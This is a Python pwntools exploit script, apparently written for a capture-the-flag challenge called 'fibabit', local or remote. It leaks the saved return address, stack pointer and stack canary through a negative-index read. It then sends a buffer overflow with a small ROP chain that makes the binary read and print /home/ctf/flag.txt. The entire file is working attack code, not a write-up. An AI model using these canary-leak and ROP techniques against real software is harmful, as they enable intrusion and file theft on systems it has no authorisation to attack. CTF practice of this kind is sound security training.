from pwnlib.tubes import process
from pwnlib.tubes import remote
from pwnlib.util import fiddling
import struct
import sys

#
CME_OFFSET = 0x494
# 0x00000000000015db: pop rdi; ret;
POP_RDI = 0x5db


def main(argv):
    if len(argv) == 1:
        tube = process.process('../challenge/fibabit')
    else:
        host, port = argv[1].split(':')
        port = int(port)
        tube = remote.remote(host, port)

    def get_to_prompt():
        return tube.recvuntil(b'> ')

    def read_at_offset(o):
        tube.send(b'%d\n' % (o+1,))
        resp = get_to_prompt()
        lines = resp.split(b'\n')
        for line in lines:
            if line.startswith(b'fib('):
                _, resp = line.split(b' = ')
                return int(resp)
        raise RuntimeError('Error no response found!')

    get_to_prompt()
    saved_rip = read_at_offset(-5)
    saved_rsp = read_at_offset(-6)
    stack_cookie = read_at_offset(-7)
    print('Saved RIP: %x, RSP %x, Stack Cookies: %x' % (
        saved_rip, saved_rsp, stack_cookie))
    text_base = saved_rip & ~0xfff
    print('Text base: %x' % text_base)

    buf_tail = b'/home/ctf/flag.txt\0'
    buf = b'/'*264
    buf += struct.pack('<Q', stack_cookie)
    buf += b'B'*8  # rbp
    # rip, needs to be canonical form
    buf += struct.pack('<Q', text_base+POP_RDI)
    buf += struct.pack('<Q', saved_rsp+0x20)
    buf += struct.pack('<Q', text_base+CME_OFFSET)
    buf += buf_tail
    tube.send(buf + b'\n')
    try:
        recp = tube.recv().decode()
        lines = recp.split('\n')
        hexlines = [l.split(' ', 1)[1].replace(' ', '') for l in lines]
        hexbuf = ''.join(hexlines)
        print(fiddling.unhex(hexbuf))
    except Exception as ex:
        print('recv failed:', ex)


if __name__ == '__main__':
    main(sys.argv)
